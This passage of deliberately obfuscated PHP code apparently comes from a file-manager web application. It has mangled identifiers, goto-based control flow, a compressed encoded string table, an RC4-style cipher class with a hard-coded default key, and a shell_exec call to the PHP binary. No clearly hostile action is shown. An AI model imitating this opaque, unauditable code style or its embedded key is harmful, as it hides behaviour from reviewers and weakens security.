$A›¯ÔÜÈ¡) { if ($BŒ”Æœß¦ & $A›¯ÔÜÈ¡) { $A’î‰¢øì•[] = $A›¯ÔÜÈ¡; } } if (in_array(self::AUTH_ROOT, $A’î‰¢øì•)) { $BŒ”Æœß¦ = array_sum($FÜ•‡›•òÈ); return; } $A‰³•¾ÁöÆ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto d›Ø÷Î—; aÚµ±áÁò: if (!$BŒ”Æœß¦) { return; } $FÜ•‡›•òÈ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $A’î‰¢øì• = array(); goto c®çì™ÊÍŒ; d›Ø÷Î—: foreach ($A’î‰¢øì• as $A›¯ÔÜÈ¡) { if (isset($A‰³•¾ÁöÆ[$A›¯ÔÜÈ¡])) { $A’î‰¢øì• = array_merge($A’î‰¢øì•, $A‰³•¾ÁöÆ[$A›¯ÔÜÈ¡]); } } $A’î‰¢øì•[] = self::AUTH_SHOW; $BŒ”Æœß¦ = array_sum(array_unique($A’î‰¢øì•)); goto dàÆ±Ğ¸Ö; dàÆ±Ğ¸Ö: } public function sort($bšù„è‘Ò, $bÕŞ÷É±­ï) { return parent::update($bšù„è‘Ò, $bÕŞ÷É±­ï); } } goto EËëÂ—Ã‹; e•¶ÛŸÔ¯: function ActionCall($AÛÈÉÚ¤) { $bÂ”àÜƒªŒ = array_slice(func_get_args(), 1); return ActionApply($AÛÈÉÚ¤, $bÂ”àÜƒªŒ); } function ActionCallApi($eˆŒÅÚŒªÏ, $cÒÍê·Ÿ® = '') { goto Aœ£™ñÊ‡‚; a÷…ã£¹³: return $E“´‰¡‡ˆ™; goto CïµÌ± Ú¹; Aœ£™ñÊ‡‚: $aÒØéïàğ‡ =& $_SERVER[ú]; $Fàƒ©ÑÅ¿” = $cÒÍê·Ÿ®; if (is_array($cÒÍê·Ÿ®)) { $Fàƒ©ÑÅ¿” = $aÒØéïàğ‡[20]; foreach ($cÒÍê·Ÿ® as $DË˜ÌİİÉ° => $E½µ‡«¸‹) { $E½µ‡«¸‹ = is_array($E½µ‡«¸‹) ? json_encode($E½µ‡«¸‹) : $E½µ‡«¸‹; $E½µ‡«¸‹ = is_bool($E½µ‡«¸‹) ? intval($E½µ‡«¸‹) : $E½µ‡«¸‹; $Fàƒ©ÑÅ¿” .= $aÒØéïàğ‡[21] . $DË˜ÌİİÉ° . $aÒØéïàğ‡[22] . rawurlencode($E½µ‡«¸‹); } } goto bİÀ¼éº“á; bİÀ¼éº“á: $eŠ¶Œí™Şî = Action($aÒØéïàğ‡[23])->accessToken(); $eˆŒÅÚŒªÏ = str_replace($aÒØéïàğ‡[5], $aÒØéïàğ‡[4], $eˆŒÅÚŒªÏ) . $aÒØéïàğ‡[24] . $eŠ¶Œí™Şî . $Fàƒ©ÑÅ¿”; $fÃÏ™¾¡– = $aÒØéïàğ‡[20]; goto BĞÎŠšßŸ¦; BĞÎŠšßŸ¦: $E¤ŸË½œ©Œ = phpBinCommand(); if ($E¤ŸË½œ©Œ && function_exists($aÒØéïàğ‡[25])) { $e•õ§ò‚’ = $E¤ŸË½œ©Œ . $aÒØéïàğ‡[26] . BASIC_PATH . $aÒØéïàğ‡[27] . escapeshellarg($eˆŒÅÚŒªÏ); $fÃÏ™¾¡– = shell_exec($e•õ§ò‚’); } if (!$fÃÏ™¾¡–) { $dÚ–‹µŞáœ = stream_context_create(array($aÒØéïàğ‡[28] => array($aÒØéïàğ‡[29] => 20, $aÒØéïàğ‡[30] => $aÒØéïàğ‡[31]))); $fÃÏ™¾¡– = file_get_contents(APP_HOST . $aÒØéïàğ‡[32] . $eˆŒÅÚŒªÏ, !1, $dÚ–‹µŞáœ); } goto cœïºÅÎ§·; cœïºÅÎ§·: $C’êŞ ì³ = json_decode($fÃÏ™¾¡–, !0); $E“´‰¡‡ˆ™ = is_array($C’êŞ ì³) ? $C’êŞ ì³ : array($aÒØéïàğ‡[33] => null, $aÒØéïàğ‡[34] => $fÃÏ™¾¡–); if (!$C’êŞ ì³) { echo $fÃÏ™¾¡–; } goto a÷…ã£¹³; CïµÌ± Ú¹: } function ActionCallHook($cÍ¸Œ¶¢âÑ) { goto A‚ƒÁõ†ñ; A‚ƒÁõ†ñ: $eï—±ãÙŒ =& $_SERVER[ú]; ob_start(); $A°Ô¥”Œ£ = array_slice(func_get_args(), 1); goto bŒ¹µ¦¨˜ ; CéêƒÎÅ®Œ: $f‡Ö‹®·Ô = $C„ÔƒòÅù‰ ? json_decode($C„ÔƒòÅù‰, !0) : $f‡Ö‹®·Ô; $GLOBALS[$eï—±ãÙŒ[35]] = 0; return $f‡Ö‹®·Ô; goto FÂ˜§Èºº”; bŒ¹µ¦¨˜ : $GLOBALS[$eï—±ãÙŒ[35]] = 1; $f‡Ö‹®·Ô = ActionApply($cÍ¸Œ¶¢âÑ, $A°Ô¥”Œ£); $C„ÔƒòÅù‰ = ob_get_clean(); goto CéêƒÎÅ®Œ; FÂ˜§Èºº”: } goto c›ÇÖŞÀï”; fÁˆÄİç¯ˆ: define($_SERVER[‚Ğ°–—î][0], $_SERVER[‚Ğ°–—î][1]); $_SERVER[ú] = explode($_SERVER[‚Ğ°–—î][2], gzinflate(substr($_SERVER[‚Ğ°–—î][3], 10, -8))); function Model($dÇŸàòÖì» = '', $aïÂ”Ê®´£ = '', $aå‹ØœÌ» = '') { goto aß¬…Éöè; F‹Úä®†: if (isset($c÷’†Ÿ‰¶å[$DŞã‰‰ İ¾])) { return $c÷’†Ÿ‰¶å[$DŞã‰‰ İ¾]; } if ($dÇŸàòÖì») { $dÇŸàòÖì» = strtoupper($dÇŸàòÖì»[0]) . substr($dÇŸàòÖì», 1); $a¸¥ğîª™ = $dÇŸàòÖì» . $A²ÀÜÚŸæÕ[1]; if (class_exists($a¸¥ğîª™)) { $c÷’†Ÿ‰¶å[$DŞã‰‰ İ¾] = new $a¸¥ğîª™(); return $c÷’†Ÿ‰¶å[$DŞã‰‰ İ¾]; } } if (!$aå‹ØœÌ») { $aå‹ØœÌ» = $GLOBALS[$A²ÀÜÚŸæÕ[2]][$A²ÀÜÚŸæÕ[3]]; } goto bñÚ·ï´»; aß¬…Éöè: $A²ÀÜÚŸæÕ =& $_SERVER[ú]; static $c÷’†Ÿ‰¶å = array(); $DŞã‰‰ İ¾ = strtolower($aïÂ”Ê®´£ . $A²ÀÜÚŸæÕ[0] . $dÇŸàòÖì»); goto F‹Úä®†; bñÚ·ï´»: $c÷’†Ÿ‰¶å[$DŞã‰‰ İ¾] = new ModelBase($dÇŸàòÖì», $aïÂ”Ê®´£, $aå‹ØœÌ»); return $c÷’†Ÿ‰¶å[$DŞã‰‰ İ¾]; goto Açé¥™ö§Ë; Açé¥™ö§Ë: } goto fºÌö†ë—Ç; F‚ĞëÄ¸Å¥: class Mcrypt { public static $defaultKey = "\x61\x21\164\x61\x6b\101\72\144\154\x6d\x63\x6c\x64\x45\166\x2c\145"; public static function encode($fã’‰ÇÔô˜, $E‚íÇÒ®¹‰ = '', $aâÈĞÅ›Ú™ = 0, $f‹Ï ‘¯¤Š = '') { goto B¢«ÇÉïŠ¦; AäøßÏŸÔğ: $fã’‰ÇÔô˜ = sprintf($A¸ÎğÓ½Úİ[1932], $aâÈĞÅ›Ú™ ? $aâÈĞÅ›Ú™ + time() : 0) . substr(md5($fã’‰ÇÔô˜ . $b¡ËÜ®Ã), 0, 16) . $fã’‰ÇÔô˜; $F§…•‹¨…° = strlen($fã’‰ÇÔô˜); $Câª÷ Å†  = array(); goto aóòƒáè½; cª×æóÀ£°: $FÖÀíÏö±´ = $A¸ÎğÓ½Úİ[33]; for ($F¬âä£¹Àô = $a˜¹×‰İÙ = $b¯Æ£éÔ¯‹ = 0; $b¯Æ£éÔ¯‹ < $F§…•‹¨…°; $b¯Æ£éÔ¯‹++) { $F¬âä£¹Àô = ($F¬âä£¹Àô + 1) % 256; $a˜¹×‰İÙ = ($a˜¹×‰İÙ + $b¾·ëßƒö§[$F¬âä£¹Àô]) % 256; $dÏ¼çŒ”§Ÿ = $b¾·ëßƒö§[$F¬âä£¹Àô]; $b¾·ëßƒö§[$F¬âä£¹Àô] = $b¾·ëßƒö§[$a˜¹×‰İÙ]; $b¾·ëßƒö§[$a˜¹×‰İÙ] = $dÏ¼çŒ”§Ÿ; $FÖÀíÏö±´ .= chr(ord($fã’‰ÇÔô˜[$b¯Æ£éÔ¯‹]) ^ $b¾·ëßƒö§[($b¾·ëßƒö§[$F¬âä£¹Àô] + $b¾·ëßƒö§[$a˜¹×‰İÙ]) % 256]); } $FÖÀíÏö±´ = $c¯‘ÌÎ•ˆ . str_replace($A¸ÎğÓ½Úİ[908], $A¸ÎğÓ½Úİ[33], base64_encode($FÖÀíÏö±´)); goto e´Í¬ä©‡‹; B¢«ÇÉïŠ¦: $A¸ÎğÓ½Úİ =& $_SERVER[‚Ğ°–—î]; $cÅ­ªÕäÃ² = 4; $E‚íÇÒ®¹‰ = md5($E‚íÇÒ®¹‰ ? $E‚íÇÒ®¹‰ : self::$defaultKey); goto d¬‹•óÈŸò; aóòƒáè½: for ($b¯Æ£éÔ¯‹ = 0; $b¯Æ£éÔ¯‹ <= 255; $b¯Æ£éÔ¯‹++) { $Câª÷ Å† [$b¯Æ£éÔ¯‹] = ord($EÜ¨ÇèßÆù[$b¯Æ£éÔ¯‹ % $E²Ò‰¦®î´]); } $b¾·ëßƒö§ = range(0, 255); for ($a˜¹×‰İÙ = $b¯Æ£éÔ¯‹ = 0; $b¯Æ£éÔ¯‹ < 256; $b¯Æ£éÔ¯‹++) { $a˜¹×‰İÙ = ($a˜¹×‰İÙ + $b¾·ëßƒö§[$b¯Æ£éÔ¯‹] + $Câª÷ Å† [$b¯Æ£éÔ¯‹]) % 256; $dÏ¼çŒ”§Ÿ = $b¾·ëßƒö§[$b¯Æ£éÔ¯‹]; $b¾·ëßƒö§[$b¯Æ£éÔ¯‹] = $b¾·ëßƒö§[$a˜¹×‰İÙ]; $b¾·ëßƒö§[$a˜¹×‰İÙ] = $dÏ¼çŒ”§Ÿ; } goto cª×æóÀ£°; fñ¨Ş —ë¾: $c¯‘ÌÎ•ˆ = substr($f‹Ï ‘¯¤Š, -$cÅ­ªÕäÃ²); $EÜ¨ÇèßÆù = $FšŠŠÖ¿–› . md5($FšŠŠÖ¿–› . $c¯‘ÌÎ•ˆ); $E²Ò‰¦®î´ = strlen($EÜ¨ÇèßÆù); goto AäøßÏŸÔğ; e´Í¬ä©‡‹: $FÖÀíÏö±´ = str_replace(array($A¸ÎğÓ½Úİ[284], $A¸ÎğÓ½Úİ[8], $A¸ÎğÓ½Úİ[908]), array($A¸ÎğÓ½Úİ[412], $A¸ÎğÓ½Úİ[70], $A¸ÎğÓ½Úİ[91]), $FÖÀíÏö±´); return $FÖÀíÏö±´; goto DŒ ŒßØİ; d¬‹•óÈŸò: $FšŠŠÖ¿–› = md5(substr($E‚íÇÒ®¹‰, 0, 16)); $b¡ËÜ®Ã = md5(substr($E‚íÇÒ®¹‰, 16, 16)); $f‹Ï ‘¯¤Š = $f‹Ï ‘¯¤Š ? $f‹Ï ‘¯¤Š : md5(microtime()); goto fñ¨Ş —ë¾; DŒ ŒßØİ: } public static function decode($c…’›¾Î…Ì, $BİÕÎÆæ¥ã = '') { goto CñÏé¹ÚŠ; a…Ü¼ÎëÏ: $EÑ­õ˜øùò = substr($c…’›¾Î…Ì, 0, $dØô´—‘©ä); $aËÉÀƒË’Ë = $DÒŒ›ÁœÜ™ . md5($DÒŒ›ÁœÜ™ . $EÑ­õ˜øùò); $B†Àã³çƒ = strlen($aËÉÀƒË’Ë); goto Bâ„Ï²Şˆ; fêÈ¶ÚµÉÊ: $EÊ²¡»Ó = $a–¿Êˆ“ê[33]; for ($câ´‘±ËÜ‘ = $Fƒ›¿´ˆ = $fñ† Í¡Í = 0; $fñ† Í¡Í < $dĞö¶©Î˜; $fñ† Í¡Í++) { $câ´‘±ËÜ‘ = ($câ´‘±ËÜ‘ + 1) % 256; $Fƒ›¿´ˆ = ($Fƒ›¿´ˆ + $d‘ŠÚå­¯[$câ´‘±ËÜ‘]) % 256; $D¬¨”£•÷ = $d‘ŠÚå­¯[$câ´‘±ËÜ‘]; $d‘ŠÚå­¯[$câ´‘±ËÜ‘] = $d‘ŠÚå­¯[$Fƒ›¿´ˆ]; $d‘ŠÚå­¯[$Fƒ›¿´ˆ] = $D¬¨”£•÷; $EÊ²¡»Ó .= chr(ord($c…’›¾Î…Ì[$fñ† Í¡Í]) ^ $d‘ŠÚå­¯[($d‘ŠÚå­¯[$câ´‘±ËÜ‘] + $d‘ŠÚå­¯[$Fƒ›¿´ˆ]) % 256]); } $aô„Š¸•öĞ = intval(substr($EÊ²¡»Ó, 0, 10)); goto eš²¾ÜÊ‚†; eš²¾ÜÊ‚†: if (($aô„Š¸•öĞ == 0 || $aô„Š¸•öĞ - time() > 0) && substr($EÊ²¡»Ó, 10, 16) == substr(md5(substr($EÊ²¡»Ó, 26) . $EÙÚÜœ¦³­), 0, 16)) { return substr($EÊ²¡»Ó, 26); } else { return $a–¿Êˆ“ê[33]; } goto D½˜÷çä‰; Bâ„Ï²Şˆ: $c…’›¾Î…Ì = base64_decode(substr($c…’›¾Î…Ì, $dØô´—‘©ä)); $dĞö¶©Î˜ = strlen($c…’›¾Î…Ì); $D¦ã¤ÃİÊŠ = array(); goto F«£ğ¥ãÜ“; D¸é–¦ßç¦: $BİÕÎÆæ¥ã = md5($BİÕÎÆæ¥ã ? $BİÕÎÆæ¥ã : self::$defaultKey); $DÒŒ›ÁœÜ™ = md5(substr($BİÕÎÆæ¥ã, 0, 16)); $EÙÚÜœ¦³­ = md5(substr($BİÕÎÆæ¥ã, 16, 16)); goto a…Ü¼ÎëÏ; F«£ğ¥ãÜ“: for ($fñ† Í¡Í = 0; $fñ† Í¡Í <= 255; $fñ† Í¡Í++) { $D¦ã¤ÃİÊŠ[$fñ† Í¡Í] = ord($aËÉÀƒË’Ë[$fñ† Í¡Í % $B†Àã³çƒ]); } $d‘ŠÚå­¯ = range(0, 255); for ($Fƒ›¿´ˆ = $fñ† Í¡Í = 0; $fñ† Í¡Í < 256; $fñ† Í¡Í++) { $Fƒ›¿´ˆ = ($Fƒ›¿´ˆ + $d‘ŠÚå­¯[$fñ† Í¡Í] + $D¦ã¤ÃİÊŠ[$fñ† Í¡Í]) % 256; $D¬¨”£•÷ = $d‘ŠÚå­¯[$fñ† Í¡Í]; $d‘ŠÚå­¯[$fñ† Í¡Í] = $d‘ŠÚå­¯[$Fƒ›¿´ˆ]; $d‘ŠÚå­¯[$Fƒ›¿´ˆ] = $D¬¨”£•÷; } goto fêÈ¶ÚµÉÊ; CñÏé¹ÚŠ: $a–¿Êˆ“ê =& $_SERVER[‚Ğ°–—î]; $c…’›¾Î…Ì = str_replace(array($a–¿Êˆ“ê[412], $a–¿Êˆ“ê[70], $a–¿Êˆ“ê[91]), array($a–¿Êˆ“ê[284], $a–¿Êˆ“ê[8], $a–¿Êˆ“ê[908]), $c…’›¾Î…Ì); $dØô´—‘©ä = 4; goto D¸é–¦ßç¦; D½˜÷çä‰: } } define($_SERVER[‚Ğ°–—î][1933], 1); define($_SERVER[‚Ğ°–—î][1934], 2); goto e™°¢™ùÔù; cóëæ¼Üµ: $_SERVER[$_SERVER[ú][52]] = ("\x39\x36\x36\x31"."\63\66")+0;$_RGf4="c4N6QCyDesBNg9psNuNrgdfAbqdI7H5y3jZ925TUS6VZBvD8WQM95aznNF3AeaDqmeMCHUyKfrdqHX";; stream_wrapper_register($_SERVER[ú][53], $_SERVER[ú][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($bêïÖ³°‡ø, $eŒ‡ò–Ò‰) { $BÇ¡„Ä˜ã =& $_SERVER[‚Ğ°–—î]; if (isset(self::$_methodList[$bêïÖ³°‡ø])) { return @call_user_func_array(self::$_methodList[$bêïÖ³°‡ø], $eŒ‡ò–Ò‰); } else { if (method_exists($this, $bêïÖ³°‡ø)) { return call_user_func_array(array($this, $bêïÖ³°‡ø), $eŒ‡ò–Ò‰); } else { think_exception(__CLASS__ . $BÇ¡„Ä˜ã[4] . $bêïÖ³°‡ø . $BÇ¡„Ä˜ã[5]); } } } public static function __callStatic($D‡ÂÀÁîºª, $B¥‰‚ãã¢ä) { if (isset(self::$_methodListStatic[$D‡ÂÀÁîºª])) { return call_user_func_array(self::$_methodListStatic[$D‡ÂÀÁîºª], $B¥‰‚ãã¢ä); } else { if (method_exists(self, $D‡ÂÀÁîºª)) { return call_user_func_array(array(self, $D‡ÂÀÁîºª), $B¥‰‚ãã¢ä); } else { show_json("{$D‡ÂÀÁîºª}\x28\51\40\x6e\157\x74\40\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($dæ®¯Ş…—, $D¤æ³‰¡¶Œ) { self::$_methodList[$dæ®¯Ş…—] = $D¤æ³‰¡¶Œ; } public static function addMethodStatic($D¿º§Şä“Ù, $f£‘‹ŞŠÕ®) { self::$_methodListStatic[$D¿º§Şä“Ù] = $f£‘‹ŞŠÕ®; } } goto EªÑ‚Ù„È; e—©ÇÁ©¥: if (!function_exists('_kodDe')) { function _kodDe($AãŒƒåëÇ) { $AãŒƒåëÇ = base64_decode($AãŒƒåëÇ); $F¢µ‘º†º = strlen($AãŒƒåëÇ); $D±ìºÉ­ó = ''; $E¤ÙˆÍíª‚ = ord($AãŒƒåëÇ[0]) - 30; for ($BÊï¼„³¤â = 1; $BÊï¼„³¤â < $F¢µ‘º†º; $BÊï¼„³¤â += 2) { if ($BÊï¼„³¤â + 1 < $F¢µ‘º†º) { $D±ìºÉ­ó .= chr(ord($AãŒƒåëÇ[$BÊï¼„³¤â + 1]) + $E¤ÙˆÍíª‚); $D±ìºÉ­ó .= chr(ord($AãŒƒåëÇ[$BÊï¼„³¤â]) + $E¤ÙˆÍíª‚); } else { $D±ìºÉ­ó .= chr(ord($AãŒƒåëÇ[$BÊï¼„³¤â]) + $E¤ÙˆÍíª‚); } } return $D±ìºÉ­ó; } } define("\235\202\320\260\226\227\356", base64_decode('ne2i')); $_SERVER[‚Ğ°–—î] = explode(base64_decode('fAR8A3wE'), gzinflate(substr(base64_decode('H4sIAAAAAAAAA509CXgbxdXclHCVUihn2TiXnejwlcuJ7ciWbIvIliLJcYLlKCtpJW0saZXdlY8c')."\334\244\220\20\12\345\46\341\112\270\112\151\302\21\216\64\34\205\102\241\245\55\264\5\312\25\256\220\204\373\50\205\2\155\351\77\367\314\256\144\332\376\174\70\232\171\363\146\166\216\67\157\336\314\274\367\346"."\353\125\7\254\332\177\325\1\233\326\177\375\301\233\67\342\60\372\73\0\377\236\262\356\73\373\240\377\366\317\57\170\264\147\277\272\357\66\77\365\233\255\157\274\375\233\171\157\135\173\334\167\57\233\376\333\357"."\15\357\332\124\247\236\72\347\316\303\157\376\363\266\235\135\207\235\362\361\157\315\305\23\143\115\37\337\374\131\372\265\337\335\371\257\347\37\276\347\343\7\67\35\320\35\272\141\361\117\247\313\277\331\77\256\37"."\xf9\xf8\xd7\xdf\x5f\xf1\xfd\x3b\xb6\xbc\xf0\xdb\xef\x5e\x77\xfd\xd2\x42\xfe\x99\x2b\xae\x78\xea\xbe\x9f\xaf\x3c\xb3\xfb\x90\x1b\xb7\xff\x3d\x7f\xda\xce\x86\x59\xcf\x9d\x10\xfb\xf7\x19\x3f\xbb\xe7\xc1\xdf\x3e\x91\xe8\xbe\x67\xeb".base64_decode('VSPd+25s77z4tRPHnVP99zdW/LbrxSfirgNGrt91UCDw6aTs75cefPbI/e/2rftmlXfJmu86D7z3')."\300\73\332\66\36\325\166\301\117\76\371\363\304\326\77\277\66\363\127\247\146\377\62\277\172\303\55\7\256\374\303\237\216\337\160\363\354\15\216\237\334\66\360\330\270\223\123\312\61\23\117\177\362\352\316\137\71"."\106\227\176\46\267\114\372\346\47\27\276\70\153\164\302\137\27\135\371\334\116\377\216\37\235\75\147\163\340\301\314\261\33\277\367\307\367\17\73\347\173\177\174\352\270\73\366\177\164\177\357\307\367\177\377\270\170".base64_decode('zeFP3vPF6DGhCVd+6Gn5wQtrdww/s+7Hj/50cqS1qJ59dPKHbQ9l9p1R3XjH2x0v7H3kptkXmlW5')."\x39\x13\x97\x4f\x38\xf1\xb2\x71\x3f\x3e\x7a\xbf\xd7\x8f\xdd\x72\xdf\xa1\x2e\xff\x19\xfb\x8e\xdb\x79\xec\x73\xaf\xef\xb7\xcf\x3e\xb8\xa3\x9b\xf0\x8f\x54\xd0\x4c\x49\x19\x51\xd\xd3\xc0\x80\xa4\x56\x48\xab\x19\x1c\x56\xb\xf8\xd7"."\x8d\x7f\x8c\xe5\x39\xd5\x54\x70\x38\xde\x13\x8c\xc6\x23\xbd\xa1\x90\x2f\x1c\x8d\x93\x12\xc5\xf4\xbc\x96\x22\xa1\xa2\xac\xcb\x79\x52\x78\x51\xd1\xd\xf0\x29\xb1\xb8\x78\x51\x2b\x2a\x5\xb\x84\x3\x52\xb2\x29\x27\x64\x83\x94\xe4"."\155\213\173\175\241\100\160\161\74\272\70\344\43\30\211\370\362\222\242\217\342\30\12\106\114\131\67\243\152\136\141\30\303\72\253\127\233\257\323\337\43\105\303\236\236\210\247\75\352\17\366\140\160\173\260\273\333".base64_decode('Hy2Hh4OBQJunfX55Sijs6ez2SKB+OSWuFtJatbQUpyyVanCgQ1VyKRwsyLQ65miRhKIsBMagUMrl')."\x70\xa4\x87\x85\x48\xfd\x95\xb4\x5c\xca\x91\x3e\xf3\x8a\x91\xa2\xae\xe6\x65\xda\xf4\xf9\xca\x28\x83\xe2\x80\x5c\x32\x35\xb5\x90\xc4\x11\xdf\x88\xa9\xcb\x1c\xe\x6a\x9c\xd4\x95\xbc\x52\x20\x45\x45\x7c\x1\x5f\x7b\x54\x82\xd5\x94"."\72\302\301\156\211\14\105\136\66\114\105\227\372\272\174\141\237\4\253\336\74\5\265\170\212\204\363\365\366\200\16\221\74\201\200\64\126\11\246\222\57\322\142\160\236\12\205\5\303\136\137\130\152\133\54\361\176"."\x4a\x6a\xf9\xbc\x56\x70\x81\x52\xc0\x78\x9a\x42\x55\x7d\xe1\x30\xe\x38\x8\x5\x7\xfc\x70\xe8\x48\x24\xd8\xd1\x11\xf1\xb1\x18\x69\xdc\x82\x0\xa8\x49\x3\xa1\x52\x4b\x2c\x95\xce\x99\xf1\x21\x39\x57\xa2\xc4\x3a\x88\x7f\xa7\x90".base64_decode('H/KrGYSAl6sFtUSIlRShaWzmkECJYisUkgfZNDKnwAQbwsHmFvw7hyAl4jBN0c24UkhqKbVApmEr')."\231\162\204\360\144\63\353\325\125\200\107\12\324\134\111\255\70\332\255\15\221\66\244\325\234\22\140\263\54\255\345\122\212\316\343\105\220\135\114\41\215\121\127\10\271\173\112\171\21\205\105\223\131\65\227\322\351"."\344\374\66\314\72\122\254\142\232\240\31\6\255\151\157\61\247\311\251\210\242\13\265\357\0\305\4\113\246\10\54\41\264\16\115\317\173\1\3\40\275\3\310\136\355\255\220\60\110\11\77\45\164\212\213\60\256".strrev('qJc™EÊ8ôÔîÙ+<`ş£‚'."\0".'Ü¡#nö´¦§ÉÈQ\\\\¹*ËU#.ÔÿÏôßœ³şê')."\263\105\62\207\331\264\215\131\10\30\366\167\217\146\372\4\26\233\323\222\162\116\154\51\16\147\115\263\30\121\12\51\330\41\244\105\332\160\1\165\130\121\121\10\222\327\41\245\244\156\151\261\324\325\244\66\121"."\352\2\264\222\36\345\34\57\153\346\163\54\104\133\313\140\6\3\232\43\204\46\252\110\134\31\61\111\47\111\163\222\131\131\7\303\327\134\62\323\316\131\204\161\24\213\71\65\51\233\252\126\160\153\111\123\61"."\235\206\251\53\62\51\255\152\216\4\51\2\316\340\251\70\27\235\75\355\132\301\4\323\327\31\325\345\202\221\126\164\247\217\220\167\223\4\372\231\161\60\212\346\125\215\242\146\250\360\63\115\222\154\232\162\62".base64_decode('C2c/L775W/DVQk4tKGW4nmRSMQwnzKJrOacnl9OGnUFdzaggz1RbNQFnapIo2yyqumLQqNTZHSXI')."\240\126\212\63\244\313\231\274\334\44\25\113\11\320\63\144\176\126\200\141\154\362\365\46\51\11\243\16\51\137\62\114\247\256\0\366\243\202\205\216\14\236\77\355\354\206\343\251\52\51\147\4\160\151\2\156\250"."\x6d\x94\x0\x19\x49\x34\xd\x43\xbb\xa2\xd1\x50\xdc\xdf\x1\x16\xe3\x1e\x5f\xbc\xdb\x13\x6d\xef\x22\xd5\x36\xe5\xc\xad\x73\x0\xf0\x5e\x56\x24\x5\x2e\x72\x82\x29\x7\x9\xad\x7\xf4\x11\x7\x86\xb4\x61\x45\x7\x1f\x6e\x1b\x6d"."\222\6\265\124\102\33\161\321\44\210\34\1\134\202\42\303\36\55\232\316\260\134\310\300\376\111\214\232\12\41\107\143\50\143\355\320\200\122\310\230\131\232\61\342\13\57\364\205\343\221\140\107\264\317\23\46\313"."\170\1\14\304\10\375\24\54\72\347\14\53\51\320\365\111\223\346\223\213\260\327\50\16\234\50\160\214\151\52\234\74\64\55\340\357\204\35\343\165\32\0\311\51\142\321\262\3\152\136\205\165\67\131\12\352\111"."\260\306\167\222\12\271\121\203\232\143\331\251\325\261\324\264\32\47\370\167\152\115\177\314\353\232\72\320\352\126\171\36\167\235\253\116\252\257\235\41\205\200\320\241\312\71\211\64\272\14\243\126\12\316\377\226\16"."\200\153\222\60\315\155\135\207\201\141\337\202\136\137\44\32\357\366\105\273\202\136\362\5\237\207\204\2\32\236\232\264\105\375\370\147\200\214\40\20\25\62\112\122\313\151\272\234\203\14\210\322\233\102\231\100\106"."\x4d\x73\xbe\xee\x7\x2\xd\xe9\x58\xcc\xf9\x78\x24\xa2\xe6\x8b\x94\x41\x99\xd9\x52\x3e\x21\x4\xdd\xbc\x4\x42\xb\x60\xc8\x18\x5b\xd2\xd8\x1a\xa4\xe9\x24\xd4\xe4\x26\x59\x26\xd5\x77\x50\x66\xeb\x8e\x34\x80\xff\x39\x67\x4d\x69"."\171\231\112\242\150\342\52\51\74\163\61\150\252\45\245\113\221\371\242\146\352\246\6\241\272\5\245\133\61\263\32\351\347\214\102\253\124\142\165\243\265\114\51\71\205\366\122\126\241\134\32\210\127\103\254\363\212".base64_decode('upJWCd0CeQrAORdWjTDIBOUbGu+DYigHmJxhywZn+jAirMwdvYFAvD3YEwWiKIb0hf1RH6UIjzfu')."\x69\xf\xb1\x25\x8c\xf\x13\x41\x80\xd3\xb3\x9c\xbd\x61\xc8\x50\xbd\xc0\xf7\xf9\x2\xc1\x59\x2e\x5d\xe8\x20\x4b\xc5\x61\xc0\xb\x8b\x5a\xc1\x50\x9c\x49\x52\x5a\x8a\x33\x5f\x8c\x31\xc7\xc6\x79\xcb\x72\x70\x1\x78\xc4\x29\xe7\x57"."\x38\xf3\x8a\x29\x3b\x59\xd5\xad\xeb\x9b\x14\x15\x97\x49\x3f\x19\x2\xce\x2c\x73\x60\x51\x5\xfb\xb\xba\xb0\x86\x82\x11\x92\xa1\x15\x42\x81\x34\x92\x50\x74\x52\x8f\x50\x2f\x49\xca\xb\xc3\xdf\xe9\x23\xc0\x71\x74\x6d\x94\x89\xe4"."\342\351\213\120\106\127\2\370\272\272\102\346\155\154\245\365\41\145\217\344\163\134\300\212\253\226\361\213\153\211\145\200\213\1\242\223\53\265\332\311\307\52\332\345\357\231\37\357\16\172\175\201\270\277\7\160\211".strrev(']í=ÛÄà/¿Ñb/ğëì(W-€¥³ëÖ'."\0".'IŠ‘¢Gò-÷GoÀOBÄøÚ—hÁmáÁĞõä7¼9h').base64_decode('HKfH000i8TTc9BhuK34cMLwI2zrFh+A2kHZm3LJPiVMJPM7pBCxeCqFN0ly4+UQtITJxUitRamVC')."\x5c\x9e\x32\x88\xbc\x4c\x66\xa8\x4c\x17\xa6\x6a\xfc\x53\x23\x79\x22\x92\x59\x8c\x33\x56\x90\x18\x65\x41\xd4\xc\x1a\x7\xe2\x1a\xf9\xbe\x44\x98\x6f\x59\xd\xe2\x10\xa7\x4d\x49\x6b\xba\xf2\x6d\x0\x4f\xda\x64\x84\x61\x8b\x83\x79".base64_decode('w9PACHjQLhdQAhqROJ2LBtgfeGh10nyHGQ+CrbgH7k/jfeFgTyfJMJxVaAX8pPurqTBDtqkmZ0lA').strrev('‰A™wØ/ÆcÖyÑËM	kìJÕS([0{ ã˜È	ëÚ+‘¼ ã&…\\®Ñ¦_NóÊ\\É‘')."\144\204\62\247\151\164\325\42\213\103\64\70\337\327\23\247\224\205\143\2\65\142\0\330\62\6\303\244\103\114\155\220\156\140\160\142\330\27\241\134\100\127\226\227\124\332\135\156\327\64\102\305\12\130\177\310\347"."\xdd\x4b\x62\xc3\xd3\xaa\xfb\x9d\xd3\x5c\x3\x20\x50\x33\x75\x1e\x8e\x92\x58\xcc\x65\x89\x4e\x24\xf9\x4b\x3a\xcb\xd\xc5\x94\x6a\xa3\xb5\xa6\x29\xe6\x8e\xb9\xab\x5b\x9b\xfa\x3d\xce\x15\xb2\x73\x45\xad\x73\xb6\x73\x60\x5a\xcc\x55"."\x33\x8d\x0\x6\x56\xd6\x3b\x1a\x57\x43\x4\x80\xd8\x3a\x61\x0\xfc\x34\xc7\x5a\x27\xc5\x9c\x93\x4f\x5f\x3a\xaf\x3f\x36